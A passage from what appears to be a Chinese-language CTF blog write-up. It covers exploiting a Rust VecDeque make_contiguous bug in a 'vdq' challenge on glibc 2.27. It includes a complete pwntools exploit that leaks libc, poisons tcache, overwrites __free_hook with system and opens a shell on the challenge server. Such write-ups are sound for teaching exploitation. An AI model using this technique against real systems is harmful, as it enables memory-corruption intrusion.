</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>ptr::copy(buf,<span style=color:#bbb> </span>buf.add(tail_len),<span style=color:#bbb> </span>self.head);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// ...DEFGH.ABC
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span>ptr::copy_nonoverlapping(buf.add(self.tail),<span style=color:#bbb> </span>buf,<span style=color:#bbb> </span>tail_len);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// ABCDEFGH....
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span>self.tail<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span><span style=color:#40a070>0</span>;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>self.head<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>len;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span>}<span style=color:#bbb> </span><span style=color:#007020;font-weight:700>else</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>if</span><span style=color:#bbb> </span>free<span style=color:#bbb> </span><span style=color:#666>&gt;=</span><span style=color:#bbb> </span>self.head<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// there is enough free space to copy the head in one go,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// this means that we first shift the tail forwards, and then
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// copy the head to the correct position.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>//
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// from: FGH....ABCDE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// to:   ...ABCDEFGH.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>ptr::copy(buf.add(self.tail),<span style=color:#bbb> </span>buf.add(self.head),<span style=color:#bbb> </span>tail_len);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// FGHABCDE....
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span>ptr::copy_nonoverlapping(buf,<span style=color:#bbb> </span>buf.add(self.head<span style=color:#bbb> </span><span style=color:#666>+</span><span style=color:#bbb> </span>tail_len),<span style=color:#bbb> </span>self.head);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// ...ABCDEFGH.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>self.tail<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.head;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>self.head<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.tail<span style=color:#bbb> </span><span style=color:#666>+</span><span style=color:#bbb> </span>len;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span>}<span style=color:#bbb> </span><span style=color:#007020;font-weight:700>else</span><span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// free is smaller than both head and tail,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// this means we have to slowly &#34;swap&#34; the tail and the head.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>//
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// from: EFGHI...ABCD or HIJK.ABCDEFG
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// to:   ABCDEFGHI... or ABCDEFGHIJK.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>left_edge: <span style=color:#902000>usize</span> <span style=color:#666>=</span><span style=color:#bbb> </span><span style=color:#40a070>0</span>;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>right_edge: <span style=color:#902000>usize</span> <span style=color:#666>=</span><span style=color:#bbb> </span>self.tail;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// The general problem looks like this
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// GHIJKLM...ABCDEF - before any swaps
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// ABCDEFM...GHIJKL - after 1 pass of swaps
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// ABCDEFGHIJM...KL - swap until the left edge reaches the temp store
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>//                  - then restart the algorithm with a new (smaller) store
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// Sometimes the temp store is reached when the right edge is at the end
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// of the buffer - this means we&#39;ve hit the right order with fewer swaps!
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// E.g
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// EF..ABCD
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#60a0b0;font-style:italic>// ABCDEF.. - after four only swaps we&#39;ve finished
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>                </span><span style=color:#007020;font-weight:700>while</span><span style=color:#bbb> </span>left_edge<span style=color:#bbb> </span><span style=color:#666>&lt;</span><span style=color:#bbb> </span>len<span style=color:#bbb> </span><span style=color:#666>&amp;&amp;</span><span style=color:#bbb> </span>right_edge<span style=color:#bbb> </span><span style=color:#666>!=</span><span style=color:#bbb> </span>cap<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                    </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>right_offset<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span><span style=color:#40a070>0</span>;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                    </span><span style=color:#007020;font-weight:700>for</span><span style=color:#bbb> </span>i<span style=color:#bbb> </span><span style=color:#007020;font-weight:700>in</span><span style=color:#bbb> </span>left_edge<span style=color:#666>..</span>right_edge<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                        </span>right_offset<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>(i<span style=color:#bbb> </span><span style=color:#666>-</span><span style=color:#bbb> </span>left_edge)<span style=color:#bbb> </span><span style=color:#666>%</span><span style=color:#bbb> </span>(cap<span style=color:#bbb> </span><span style=color:#666>-</span><span style=color:#bbb> </span>right_edge);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>src: <span style=color:#902000>isize</span> <span style=color:#666>=</span><span style=color:#bbb> </span>(right_edge<span style=color:#bbb> </span><span style=color:#666>+</span><span style=color:#bbb> </span>right_offset)<span style=color:#bbb> </span><span style=color:#007020;font-weight:700>as</span><span style=color:#bbb> </span><span style=color:#902000>isize</span>;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                        </span>ptr::swap(buf.add(i),<span style=color:#bbb> </span>buf.offset(src));<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                    </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                    </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>n_ops<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>right_edge<span style=color:#bbb> </span><span style=color:#666>-</span><span style=color:#bbb> </span>left_edge;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                    </span>left_edge<span style=color:#bbb> </span><span style=color:#666>+=</span><span style=color:#bbb> </span>n_ops;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                    </span>right_edge<span style=color:#bbb> </span><span style=color:#666>+=</span><span style=color:#bbb> </span>right_offset<span style=color:#bbb> </span><span style=color:#666>+</span><span style=color:#bbb> </span><span style=color:#40a070>1</span>;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>self.tail<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span><span style=color:#40a070>0</span>;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>                </span>self.head<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>len;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>tail<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.tail;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>head<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.head;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb> </span><span style=color:#666>&amp;</span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>self.buffer_as_mut_slice()[tail<span style=color:#666>..</span>head]<span style=color:#bbb> </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>    </span>}<span style=color:#bbb>
</span></span></span></code></pre></div><p>经过多次尝试和阅读源码，最后的构造方法为先构造出循环队列，也就是 head &lt; tail，然后由于不太清楚触发绕回的条件，就复刻 fuzz 的 poc 情况，让 make_contiguous 后 <code>head == cap</code>。由此就可以回绕后 remove 来 double free，view 来 leak，append 来 UAF。</p><p>由于是 libc 2.27-3ubuntu1.5</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/2168199752.png alt="libc 2.27"></p><p>可以看出已经 apply 了 tcache double free 的 patch。但是 2.27 中判断对应的 tcache bin 是否为空是通过 <code>tcache->entries[tc_idx] != NULL</code> 来判断的，所以通过 append 方法来 UAF tcache 底部的 chunk 即可任意地址分配，然后打 <code>__free_hook</code> 即可 getshell。</p><p>于是就有 exp：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>operations <span style=color:#666>=</span> <span style=color:#4070a0>&#34;[&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Add</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Add</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Remove</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Remove</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Append</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Append</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>View</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>View</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Archive</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Archive</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DoOperations</span>():
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;!&#34;</span>, operations[:<span style=color:#666>-</span><span style=color:#40a070>2</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#34;]&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;$&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DoAdd</span>(message):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;message :&#34;</span>, message)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DoAppend</span>(message):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;message :&#34;</span>, message)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./vdq&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>)
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;120.77.10.180&#34;</span>, <span style=color:#40a070>34927</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(sh, &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#b * 0x555555554000 + 0xDFAF</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#c</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#b * 0x555555554000 + 0xDD04</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#&#34;&#34;&#34;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Add()
</span></span><span style=display:flex><span>Add()
</span></span><span style=display:flex><span>Archive()
</span></span><span style=display:flex><span>Add()
</span></span><span style=display:flex><span>Archive()
</span></span><span style=display:flex><span>Add()
</span></span><span style=display:flex><span>Add()
</span></span><span style=display:flex><span>View()
</span></span><span style=display:flex><span>Remove()
</span></span><span style=display:flex><span>Remove()
</span></span><span style=display:flex><span>Remove()
</span></span><span style=display:flex><span>View()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>31</span>):
</span></span><span style=display:flex><span>    Add()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>20</span>):
</span></span><span style=display:flex><span>    Archive()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>10</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>    Add()
</span></span><span style=display:flex><span>View()
</span></span><span style=display:flex><span>Remove()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>31</span>):
</span></span><span style=display:flex><span>    Remove()
</span></span><span style=display:flex><span>Append()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>9</span>):
</span></span><span style=display:flex><span>    Add()
</span></span><span style=display:flex><span>DoOperations()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DoAdd(<span style=color:#4070a0>&#39;A&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x80</span>)
</span></span><span style=display:flex><span>DoAdd(<span style=color:#4070a0>&#39;B&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x80</span>)
</span></span><span style=display:flex><span>DoAdd(<span style=color:#4070a0>&#39;C&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x420</span>)
</span></span><span style=display:flex><span>DoAdd(<span style=color:#4070a0>&#39;D&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x80</span>)
</span></span><span style=display:flex><span>DoAdd(<span style=color:#4070a0>&#39;E&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x80</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Removed note [5]</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Cached notes:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&gt;&#34;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&gt; &#34;</span>)
</span></span><span style=display:flex><span>libc_base_list <span style=color:#666>=</span> <span style=color:#007020>list</span>(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>12</span>)[::<span style=color:#666>-</span><span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>6</span>):
</span></span><span style=display:flex><span>    tmp <span style=color:#666>=</span> libc_base_list[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>]
</span></span><span style=display:flex><span>    libc_base_list[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>] <span style=color:#666>=</span> libc_base_list[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i]
</span></span><span style=display:flex><span>    libc_base_list[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i] <span style=color:#666>=</span> tmp
</span></span><span style=display:flex><span>libc_base_str <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span><span style=color:#666>.</span>join(libc_base_list)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(libc_base_str, <span style=color:#40a070>16</span>) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>0x60</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>31</span>):
</span></span><span style=display:flex><span>    DoAdd(<span style=color:#4070a0>&#39;&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>11</span>):
</span></span><span style=display:flex><span>    DoAdd(<span style=color:#4070a0>&#39;&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>__free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span>DoAdd(p64(__free_hook))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#40a070>7</span>):
</span></span><span style=display:flex><span>    DoAdd(<span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>DoAdd(p64(system))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div></section><div class=post-tags></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>